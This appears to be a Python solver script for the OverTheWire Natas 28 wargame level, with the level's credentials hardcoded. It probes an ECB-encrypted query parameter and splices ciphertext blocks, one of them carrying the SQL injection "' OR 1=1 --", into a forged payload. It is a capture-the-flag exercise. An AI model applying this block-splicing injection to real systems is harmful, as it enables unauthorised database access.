import requests
import base64
from urllib.parse import urlparse, parse_qs

url = "http://natas28.natas.labs.overthewire.org/"
auth = ("natas28","1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj")
first_A_numb=1
# '''This section of code write the blocks for n As:'''
# for i in range(first_A_numb,12):
#     respond = requests.Session().post(url,auth=auth,data={"query":"A"*i})
#     query = parse_qs(urlparse(respond.url).query)['query'][0]
#     encoded = base64.b64decode(query).hex()
#     print("-"*32)
#     print(str(i)+"*A :")
#     for j in range(2,len(encoded)//32):
#         print(encoded[32*j:32*(j+1)])
#     print("")

# '''This section of code check where a block is going to be fixed : '''
# count=2
# fixed_block=[]
# for i in range(first_A_numb,50):
#     respond = requests.Session().post(url,auth=auth,data={"query":"A"*i})
#     query = parse_qs(urlparse(respond.url).query)['query'][0]
#     encoded = base64.b64decode(query).hex()
#     for j in range(2,len(encoded)//32):
#         if(j == count and i!=first_A_numb and encoded[32*j:32*(j+1)]==line):
#             fixed_block.append(i-1)
#             count+=1
#     line=encoded[32*count:32*(count+1)]
# for i in fixed_block:
#     print("At "+str(i)+" A's, line "+str(fixed_block.index(i))+" fixed")

'''Check a specific search input : '''
# char=["A","a","b","c","'","\"","\\"]
# char2=["          "]
# for i in char2:
#     respond = requests.Session().post(url,auth=auth,data={"query":i})
#     query = parse_qs(urlparse(respond.url).query)['query'][0]
#     encoded = base64.b64decode(query).hex()
#     print("-"*32)
#     print("A"*9+i+" : ")
#     for j in range(2,len(encoded)//32):
#         print(encoded[32*j:32*(j+1)])
#     print("")

# '''Create the payload'''
char=["'","\"","\\"]
payload=""
#first and second block which is a constant:
respond = requests.Session().post(url,auth=auth,data={"query":"Afghadad"})
query = parse_qs(urlparse(respond.url).query)['query'][0]
encoded = base64.b64decode(query).hex()
payload=encoded[:64]
#last 2 blocks which are also constant for (9A's + any char):
respond = requests.Session().post(url,auth=auth,data={"query":"A"*9+"a"})
query = parse_qs(urlparse(respond.url).query)['query'][0]
encoded = base64.b64decode(query).hex()
trailer=""
for j in range(len(encoded)//32-2,len(encoded)//32):
    trailer=trailer+encoded[32*j:32*(j+1)]
#Dummy block (3rd safe block):
respond = requests.Session().post(url,auth=auth,data={"query":"          "})
query = parse_qs(urlparse(respond.url).query)['query'][0]
encoded = base64.b64decode(query).hex()
dummy=""
for j in range(len(encoded)//32-3,len(encoded)//32-2):
    dummy=encoded[32*j:32*(j+1)]
#bad block (3rd bad block):
respond = requests.Session().post(url,auth=auth,data={"query":"AAAAAAAAA'"})
query = parse_qs(urlparse(respond.url).query)['query'][0]
encoded = base64.b64decode(query).hex()
bad=""
for j in range(len(encoded)//32-3,len(encoded)//32-2):
    bad=encoded[32*j:32*(j+1)]
#Query sql formula:
char=["A","a","b","c","'","\"","\\"]
char2=["AAAAAAAAA' OR 1=1 --"]
for i in char2:
    respond = requests.Session().post(url,auth=auth,data={"query":i})
    query = parse_qs(urlparse(respond.url).query)['query'][0]
    encoded = base64.b64decode(query).hex()
    print("-"*32)
    print("A"*9+i+" : ")
    for j in range(len(encoded)//32-3,len(encoded)//32-2):
        sql_part=encoded[32*j:32*(j+1)]
payload=payload+dummy+sql_part+trailer
print(payload)